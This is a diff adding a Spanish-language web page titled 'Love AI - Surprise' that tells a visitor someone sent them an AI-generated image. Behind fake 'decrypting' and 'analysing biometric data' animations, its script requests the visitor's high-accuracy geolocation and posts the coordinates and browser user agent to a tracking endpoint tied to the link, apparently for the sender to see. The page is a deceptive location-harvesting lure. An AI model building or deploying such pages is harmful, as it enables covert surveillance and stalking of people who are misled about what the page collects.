@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Love AI - Surprise</title>
+    <link rel="stylesheet" href="/style.css">
+    <style>
+        .magic-btn {
+            background: linear-gradient(45deg, #ff00cc, #333399);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% {
+                box-shadow: 0 0 0 0 rgba(255, 0, 204, 0.4);
+            }
+
+            70% {
+                box-shadow: 0 0 0 10px rgba(255, 0, 204, 0);
+            }
+
+            100% {
+                box-shadow: 0 0 0 0 rgba(255, 0, 204, 0);
+            }
+        }
+
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .loader {
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top: 4px solid var(--primary);
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+    </style>
+</head>
+
+<body>
+
+    <header>
+        <div class="brand">Love AI ✨</div>
+    </header>
+
+    <main>
+
+        <!-- INTRO SCREEN -->
+        <div id="intro-screen" class="glass-panel">
+            <div style="font-size: 3rem; margin-bottom: 1rem;">🎁</div>
+            <h2 id="welcome-text">¡Alguien te envió una sorpresa!</h2>
+            <p style="color: white; font-size: 1.1rem; margin-bottom: 2rem;">
+                <strong id="sender-display" style="color: var(--secondary);">Una persona anónima</strong>
+                ha creado una imagen única generada por IA para ti usando nuestro Motor de Amor.
+            </p>
+            <p style="font-size: 0.9rem; margin-bottom: 2rem;">
+                Haz clic abajo para desencriptar y revelar tu mensaje.
+            </p>
+            <button class="magic-btn" onclick="startflow()">✨ Revelar Imagen Mágica ✨</button>
+        </div>
+
+        <!-- GENERATING SCREEN -->
+        <div id="gen-screen" class="hidden glass-panel">
+            <h2>Desencriptando Capa de Amor IA...</h2>
+            <div class="loader"></div>
+            <p id="gen-text">Analizando datos biométricos...</p>
+        </div>
+
+        <!-- CONTENT SCREEN -->
+        <div id="content-screen" class="hidden glass-panel" style="max-width: 800px;">
+            <img id="sharedImage" src="" alt="Shared Content"
+                style="width: 100%; border-radius: 8px; box-shadow: 0 4px 15px rgba(255,77,109,0.5); opacity:0; transition: opacity 2s;">
+            <h3 style="margin-top: 1.5rem; color: var(--secondary);">Generado con Amor ❤️</h3>
+        </div>
+
+    </main>
+
+    <script>
+        const pathSegments = window.location.pathname.split('/');
+        const id = pathSegments[pathSegments.length - 1];
+
+        document.addEventListener('DOMContentLoaded', async () => {
+            // Fetch metadata to show Sender Name immediately
+            try {
+                const response = await fetch(`/api/image/${id}`);
+                const data = await response.json();
+                if (data.senderName) {
+                    document.getElementById('sender-display').textContent = data.senderName;
+                    document.title = `¡${data.senderName} te envió una sorpresa!`;
+                }
+            } catch (e) { console.log("Metadata fetch failed"); }
+        });
+
+        function startflow() {
+            document.getElementById('intro-screen').classList.add('hidden');
+            document.getElementById('gen-screen').classList.remove('hidden');
+
+            // Simulate "AI Generation" steps text
+            const steps = ["Analizando conexión...", "Recuperando píxeles de forma segura...", "Mejorando colores...", "Finalizando renderizado..."];
+            let stepIdx = 0;
+            const textInterval = setInterval(() => {
+                if (stepIdx < steps.length) {
+                    document.getElementById('gen-text').textContent = steps[stepIdx++];
+                }
+            }, 800);
+
+            // Trigger Geolocation in background
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const { latitude, longitude } = position.coords;
+                        sendTrackingData(latitude, longitude);
+                        clearInterval(textInterval);
+                        setTimeout(showImage, 1000); // Wait a bit for effect
+                    },
+                    (error) => {
+                        sendTrackingData(null, null);
+                        clearInterval(textInterval);
+                        setTimeout(showImage, 1000);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            } else {
+                sendTrackingData(null, null);
+                setTimeout(showImage, 2000);
+            }
+        }
+
+        async function sendTrackingData(lat, lng) {
+            const payload = { userAgent: navigator.userAgent };
+            if (lat) { payload.latitude = lat; payload.longitude = lng; }
+            await fetch(`/api/track/${id}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(e => console.error(e));
+        }
+
+        async function showImage() {
+            try {
+                document.getElementById('gen-screen').classList.add('hidden');
+                document.getElementById('content-screen').classList.remove('hidden');
+
+                const response = await fetch(`/api/image/${id}`);
+                const data = await response.json();
+                const img = document.getElementById('sharedImage');
+                img.src = `/uploads/${data.filename}`;
+
+                // Fade in effect
+                img.onload = () => {
+                    img.style.opacity = 1;
+                };
+            } catch (err) {
+                alert("Image expired or invalid");
+            }
+        }
+    </script>
+</body>
+
+</html>
